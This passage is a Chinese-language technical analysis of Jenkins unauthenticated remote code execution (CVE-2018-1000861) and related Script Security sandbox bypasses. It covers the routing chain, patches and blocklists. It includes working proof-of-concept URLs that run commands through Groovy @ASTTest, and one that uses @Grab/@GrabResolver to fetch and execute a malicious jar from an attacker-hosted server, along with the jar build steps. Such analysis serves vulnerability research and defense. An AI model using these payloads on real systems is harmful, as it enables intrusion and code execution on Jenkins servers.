> 2.恰巧这个方法又符合动态路由调用`get(...)`的命名规则, 因此 `getClass()` 可在 Jenkins
> 调用链中被动态呼叫
>
> 3.入口检查的白名单绕过
**@orange** 举了一个例子
    http://jenkin.local/adjuncts/whatever/class/classLoader/resource/index.jsp/content
会从上倒下依次执行
    jenkins.model.Jenkins.getAdjuncts("whatever") 
    .getClass()
    .getClassLoader()
    .getResource("index.jsp")
    .getContent()
从这个例子中我们看到如果是`xx.com/adjuncts/aa/bb/cc`，那么jenkins就会去寻找getAa、getBb等相关get方法，也就是说在这里我们可以任意操作GETTER方法。
回到最早的用来测试路由`/securityRealm/user/test`，我们也很清楚的看到这里去寻找`jenkins.model.Jenkins.getsecurityRealm()`。
##### 利用链条
再回到orange给的这个路由`/securityRealm/user/test`，跟进去，这个我们之前聊过，根据这个路由解析过程应该是分别是
**getsecurityRealm** 和 **getUser** ，当解析 **getUser** 的时候来到的是
**hudson.security.HudsonPrivateSecurityRealm.getUser** 中。
跟进 **hudson.security.HudsonPrivateSecurityRealm.getUser**
，这里实际上和我们的url一致了，上图中的url实际上是user/test，这里根据传入的下一节点名当做 id，然后生成一个 User
出来，所以这里将test传入 **getUser** 构造方法中，并调用 **hudson.model.User**
进行处理，最后生成一个User出来，但是测试发现如果没有用户一样能够生成，具体原因没有去深究。
这里看看User的继承关系，这里有个`hudson.model.DescriptorByNameOwner#getDescriptorByName`。
实际上是User中写了一个 **getDescriptorByName**
方法，是来自`hudson.model.DescriptorByNameOwner#getDescriptorByName`这个接口。
    public Descriptor getDescriptorByName(String className) {
            return Jenkins.getInstance().getDescriptorByName(className);
        }
而这个方法中的实际上就是调用了 **Jenkins.getInstance().getDescriptorByName** ，跟进
**jenkins.model.Jenkins#getDescriptorByName** ，调用了
**jenkins.model.Jenkins#getDescriptor**
    public Descriptor getDescriptorByName(String id) {
            return this.getDescriptor(id);
        }
跟进 **jenkins.model.Jenkins#getDescriptor** ，这里根据 **id(string)** 来获取所有继承了
**Descriptor** 的子类
也就是说实际上我们通过构造`/securityRealm/user/DescriptorByName/xxx`就可以使用了继承了
**Descriptor** 这个的子类。
利用链：
**Jenkins ->HudsonPrivateSecurityRealm->User->DescriptorByNameOwner->Jenkins->Descriptor**
我们从登陆限制的情况下，利用这个方法可以绕过限制，从而达到未授权访问某些功能的目的。
##### 沙盒绕过
和[Script Security
Plugin](https://wiki.jenkins.io/display/JENKINS/Script+Security+Plugin)相关的沙盒bypass在这里
###### SECURITY-1266:
从官方通告来看，更新了一个 **groovy** 沙盒绕过的问题。
可以看看orange给出的两个poc
    http://localhost:8080/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import+groovy.transform.*%0a
    %40ASTTest(value%3d%7bassert+java.lang.Runtime.getRuntime().exec(%22open+%2fApplications%2fCalculator.app%22)%7d)%0a
    class+Person%7b%7d
    http://localhost:8080/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=@GrabConfig(disableChecksums=true)%0a
    @GrabResolver(name='Exp', root='http://127.0.0.1:9999/')%0a
    @Grab(group='demo_server.exp', module='poc', version='2')%0a
    import Exp;
分别开看看，可恶意看到的触发的类都是`org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript`，跟进来看。
**DescriptorImpl** 方法继承了 **Descriptor** ，且在 **doCheckScript** 里面，实例化了
**GroovyShell** 对象，并且输出，根据前面的分析 **doCheckScript** 可控。
**@ASTTest：执行断言的时候执行代码**
这个和PHP的assert有点像。
**Grab：引入外部恶意类**
`Grape`是groovy内置的依赖管理引擎，而且在[官方文档](http://docs.groovy-lang.org/latest/html/documentation/grape.html)中，我们发现它可以将root地址自行指定，从而引入恶意类。
    javac Exp.java
    mkdir -p META-INF/services/
    echo Exp > META-INF/services/org.codehaus.groovy.plugins.Runners
    jar cvf poc-2.jar Exp.class META-INF
    mkdir -p ./demo_server/exp/poc/2/
    mv poc-2.jar demo_server/exp/poc/2/
**补丁：**
[地址](https://github.com/jenkinsci/script-security-plugin/commit/2c5122e50742dd16492f9424992deb21cc07837c)
    private static final List> BLOCKED_TRANSFORMS = ImmutableList.of(ASTTest.class, Grab.class);
###### SECURITY-1292:
[commit地址](https://github.com/jenkinsci/script-security-plugin/commit/35119273101af26792457ec177f34f6f4fa49d99)
官方测试案例：
补丁：
###### **SECURITY-1318、SECURITY-1319、SECURITY-1320、SECURITY-1321:**
[commit地址](https://github.com/jenkinsci/script-security-plugin/commit/3228c88e84f0b2f24845b6466cae35617e082059)
**SECURITY-1318：**
    @Grapes([@Grab(group='foo', module='bar', version='1.0')])\ndef foo\n
    @GrabConfig(autoDownload=false)\ndef foo\n
    @GrabExclude(group='org.mortbay.jetty', module='jetty-util')\ndef foo\n
**SECURITY-1319：**
    @GrabResolver(name='restlet.org', root='http://maven.restlet.org')\ndef foo\n
**SECURITY-1320：**
    import groovy.transform.ASTTest as lolwut\n" +
                    "import jenkins.model.Jenkins\n" +
                    "import hudson.model.FreeStyleProject\n" +
                    "@lolwut(value={ assert Jenkins.getInstance().createProject(FreeStyleProject.class, \"should-not-exist\") })\n" +
                    "int x\n" +
                    "echo 'hello'\n", false
    "import groovy.transform.*\n" +
                    "import jenkins.model.Jenkins\n" +
                    "import hudson.model.FreeStyleProject\n" +
                    "@groovy.transform.ASTTest(value={ assert Jenkins.getInstance().createProject(FreeStyleProject.class, \"should-not-exist\") })\n" +
                    "@Field int x\n" +
                    "echo 'hello'\n", false
**SECURITY-1321：**
    import groovy.transform.*\n" +
                    "import jenkins.model.Jenkins\n" +
                    "import hudson.model.FreeStyleProject\n" +
                    "@AnnotationCollector([ASTTest]) @interface Lol {}\n" +
                    "@Lol(value={ assert Jenkins.getInstance().createProject(FreeStyleProject.class, \"should-not-exist\") })\n" +
                    "@Field int x\n" +
                    "echo 'hello'\n", false
**补丁：**
还是1266修复时候那个方法，增强了黑名单。
    BLOCKED_TRANSFORMS = 
    ImmutableList.of(ASTTest.class.getCanonicalName(),
    Grab.class.getCanonicalName(),
    GrabConfig.class.getCanonicalName(), 
    GrabExclude.class.getCanonicalName(), 
    GrabResolver.class.getCanonicalName(),
    Grapes.class.getCanonicalName(), 
    AnnotationCollector.class.getCanonicalName());
###### SECURITY-1353:
[commit地址](https://github.com/jenkinsci/script-security-plugin/commit/8424ad90547e37a2bd3b6a3a7da48eb1af9cd0ee)
    assertRejected(new StaticWhitelist("staticMethod java.util.Locale getDefault"), "method java.util.Locale getCountry", "interface I {String getCountry()}; (Locale.getDefault() as I).getCountry()");
            assertRejected(new StaticWhitelist("staticMethod java.util.Locale getDefault"), "method java.util.Locale getCountry", "interface I {String getCountry()}; (Locale.getDefault() as I).country");
            assertRejected(new ProxyWhitelist(), "staticMethod java.util.Locale getAvailableLocales", "interface I {Locale[] getAvailableLocales()}; (Locale as I).getAvailableLocales()");
            assertRejected(new ProxyWhitelist(), "staticMethod java.util.Locale getAvailableLocales", "interface I {Locale[] getAvailableLocales()}; (Locale as I).availableLocales");
            assertEvaluate(new StaticWhitelist("staticMethod java.lang.Math max int int"), 3.0d, "(double) Math.max(2, 3)");
            assertEvaluate(new StaticWhitelist("staticMethod java.lang.Math max int int"), 3.0d, "Math.max(2, 3) as double");
            assertEvaluate(new StaticWhitelist("staticMethod java.lang.Math max int int"), 3.0d, "double x = Math.max(2, 3); x");
            assertRejected(new GenericWhitelist(), "staticMethod org.codehaus.groovy.runtime.ScriptBytecodeAdapter asType java.lang.Object java.lang.Class",
                "def f = org.codehaus.groovy.runtime.ScriptBytecodeAdapter.asType(['/tmp'], File); echo(/$f/)");
            assertRejected(new GenericWhitelist(), "staticMethod org.codehaus.groovy.runtime.ScriptBytecodeAdapter castToType java.lang.Object java.lang.Class",
                "def f = org.codehaus.groovy.runtime.ScriptBytecodeAdapter.castToType(['/tmp'], File); echo(/$f/)");
            assertRejected(new GenericWhitelist(), "new java.io.File java.lang.String",
                "def f = org.kohsuke.groovy.sandbox.impl.Checker.checkedCast(File, ['/tmp'], true, false, false); echo(/$f/)");
**补丁：**
在执行的时候只执行白名单，并且加强白名单和黑名单。
### 总结
可以看到这种RCE的漏洞，Jenkins从目前修复来看，基本上都是白名单、黑名单或者黑名单+白名单的方式，来解决问题。
## 0x04 漏洞利用
github上面有个项目叫做[pwn_jenkins](https://github.com/gquere/pwn_jenkins)，总结了一些jenkins
rce的利用方式，这项目还是不错的。
## Reference
[Jenkins%20RCE分析（CVE-2018-1000861分析](https://lucifaer.com/2019/03/04/Jenkins
RCE分析（CVE-2018-1000861分析)
[jenkins 无限制 rce 分析](https://xz.aliyun.com/t/3912#toc-8)